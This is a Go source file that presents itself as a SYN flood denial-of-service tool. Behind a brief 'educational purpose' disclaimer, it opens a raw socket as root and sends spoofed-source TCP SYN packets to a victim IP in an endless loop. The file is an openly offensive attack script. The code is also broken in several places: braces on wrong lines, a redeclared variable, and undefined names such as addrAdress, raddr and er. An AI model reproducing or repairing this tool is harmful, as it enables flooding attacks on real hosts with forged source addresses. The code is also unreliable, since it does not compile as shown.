/*
This synflood attack has been created by Pablo Corbalán
Remember to use this attack just for educational prupose.

Check the repo of the attack at: https//github.com/PabloCorbCon/go-synflood

Pablo Corbalán (@pablocorncon) - C[2020]
*/

package main
import (
  // import all the packages needed.
	"errors"
	"log"
	"math/rand"
	"net"
  "time"
	"os"
	"runtime"
	"syscall"
  // import the custom google packages from their  github.
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

/*
the main function of the app, from here the app is started to run the
Denial of service attack.
*/
func main() {
  // Configure the log attributes [prefix, flags] to "" and 0
	log.SetPrefix("")
	log.SetFlags(0)
  // check if the user is not running from the root.
	if os.Geteuid() != 0
  {
    // raise the error
		log.Fatal(errors.New("['Error']: Please run the app from the root."))
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	check(err)
  // check the number of args [os.Args]
	if len(os.Args) < 3
  {
    // invalid use of the program, let's inform the user.
		log.Fatal("[Usage]: synflood <victimIP> <spoofedIP>")
	}
	raddrAdress := net.ParseIP(os.Args[1]) // get the raddr address
	raddrAdress := syscall.SockaddrInet4
  {
		Port: 0,
		Addr: to4Array(raddrAdress),
	}
	p := packet(raddrAdress)
  // check the runtime using a swithc statement.
	switch runtime.GOOS
  {
	case "darwin", "dragonfly", "freebsd", "netbsd":
		// need to set explicitly
		check(syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1))
		// no need to receive anything
		check(syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1))
	case "linux":
		// no need to receive anything
		check(syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 0))
	}
	for
  {
		check(syscall.Sendto(fd, p, 0, &addrAdress))
	}
}


func packet(raddrAdress net.IP) []byte {
	ip := &layers.IPv4{
		Version:           0x4,
		TOS:               0x0,
		TTL:               0x40,
		Protocol:          layers.IPProtocolTCP,
		SrcIP:             net.ParseIP(os.Args[2]),
		DstIP:             raddrAdress,
		WithRawINETSocket: true,
	}
	rand.Seed(time.Now().UnixNano())
	tcp := &layers.TCP{
		SrcPort:    layers.TCPPort(rand.Uint32()),
		DstPort:    0x50,
		Seq:        rand.Uint32(),
		DataOffset: 0x5,
		SYN:        true,
		Window:     0xaaaa,
	}
  // create all the tcp snl protocol(s)
	tcp.SetNetworkLayerForChecksum(ip)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{true, true}
	check(gopacket.SerializeLayers(buf, opts, ip, tcp))
	return buf.Bytes()
}

func to4Array(raddrAdress net.IP) (raddrb [4]byte) {
	copy(raddrb[:], raddr.To4())
	return
}

func check(err error) {
	if err != nil {
    // there was a fatal error
		log.Fatal(er)
	}
}
